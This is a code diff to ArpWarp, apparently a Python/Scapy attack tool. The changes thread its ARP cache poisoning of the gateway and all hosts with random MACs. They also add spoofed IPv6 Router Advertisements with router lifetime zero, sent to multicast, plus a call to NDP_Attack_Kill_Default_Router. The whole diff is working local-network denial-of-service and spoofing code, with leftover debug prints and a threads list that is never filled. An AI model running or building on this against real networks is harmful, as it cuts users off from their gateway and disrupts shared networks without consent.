@@ -47,10 +47,9 @@ class ArpWarp:
 
         self.gateway_ipv4 = gateway or self.get_gateway_ipv4(self.network_interface)
         self.gateway_mac = getmacbyip(self.gateway_ipv4)
-        self.gateway_ipv6 = mac2ipv6_ll(self.gateway_mac, IPV6_LL_PREF)
-
         if not self.gateway_mac:
             raise Exception(f"[!] Unable to get gateway mac -> {self.gateway_ipv4}")
+        self.gateway_ipv6 = mac2ipv6_ll(self.gateway_mac, IPV6_LL_PREF)
 
         self.print_settings()
 
@@ -90,13 +89,12 @@ class ArpWarp:
                     host = line[s_idx:e_idx]
                     if host not in ipv6_hosts:
                         ipv6_hosts[host] = in6_addrtomac(host)  # returns None on fail
-            # print("@", ipv6_hosts)
-            # print("!", self.gateway_ipv6)  # TODO check if this is in above
         except Exception:
             pass
         return ipv6_hosts
 
     def refresh_ipv6_hosts(self):
+        print("here")
         self.ipv6_user_hosts.update(self.get_all_hosts_ipv6())
 
     def poison_arp(self):
@@ -104,29 +102,50 @@ class ArpWarp:
         * poison the gateway arp cache with a spoofed mac address for every possible host
         * poison every possible host with a spoofed mac address for the gateway
         """
+        threads = list()
         for host_ip in self.host_ipv4s:
-            # poison gateways's arp cache
-            arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ipv4)
-            sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
+            t = threading.Thread(target=self.send_arp_packets, args=(host_ip,))
+            t.start()
+        for t in threads:
+            t.join()
 
-            # poison host's arp cache
-            arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
-            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
+    def send_arp_packets(self, host_ip):
+        # poison gateways's arp cache
+        arp_packet_gateway = ARP(op=2, psrc=host_ip, hwdst=self.gateway_mac, hwsrc=RandMAC(), pdst=self.gateway_ipv4)
+        sendp(Ether() / arp_packet_gateway, iface=self.network_interface)
+
+        # poison host's arp cache
+        arp_packet_host = ARP(op=2, psrc=self.gateway_ipv4, hwsrc=RandMAC(), pdst=host_ip)
+        sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_packet_host, iface=self.network_interface)
 
     def poison_ra(self):
         """
-        * send every host a spoofed RA packet with a fake MAC, using the routers lladdr  # todo test
+        * send every host a spoofed RA packet with a fake MAC and router lifetime set to zero, using the routers lladdr
+        *
         """
-        for host_lladdr, host_hwaddr in self.host_ipv6s.items():
-            rand_mac = RandMAC()
-            ether_packet = Ether(src=rand_mac, dst=host_hwaddr) if host_hwaddr else Ether(src=rand_mac)
-            spoofed_ra = ether_packet / \
-                         IPv6(src=self.gateway_ipv6, dst=host_lladdr) / \
-                         ICMPv6ND_RA() / \
-                         ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) / \
-                         ICMPv6NDOptMTU() / \
-                         ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
-            sendp(spoofed_ra, iface=self.network_interface)
+        rand_mac = RandMAC()
+        t = time.time() * 1000
+        # for host_lladdr, host_hwaddr in self.host_ipv6s.items():
+        #     ether_packet = Ether(src=self.gateway_mac, dst=host_hwaddr) if host_hwaddr else Ether(src=rand_mac)
+        #     spoofed_ra = ether_packet / \
+        #                  IPv6(src=self.gateway_ipv6, dst=host_lladdr) / \
+        #                  ICMPv6ND_RA(chlim=255, routerlifetime=0, reachabletime=0) / \
+        #                  ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) / \
+        #                  ICMPv6NDOptMTU() / \
+        #                  ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
+        #     sendp(spoofed_ra, iface=self.network_interface)
+
+        # also multicast just in case
+        spoofed_mc_ra = Ether(src=rand_mac) / \
+                        IPv6(src=self.gateway_ipv6, dst=IPV6_MULTIC_ADDR) / \
+                        ICMPv6ND_RA(chlim=255, routerlifetime=0, reachabletime=0) / \
+                        ICMPv6NDOptSrcLLAddr(lladdr=rand_mac) / \
+                        ICMPv6NDOptMTU() / \
+                        ICMPv6NDOptPrefixInfo(prefixlen=self.ipv6_preflen, prefix=f"{IPV6_LL_PREF}::")
+        sendp(spoofed_mc_ra)
+        d = time.time() * 1000
+        print(int(t - d))
+        NDP_Attack_Kill_Default_Router(iface="en0")
 
     def start_attack(self):
         loop_count = 0
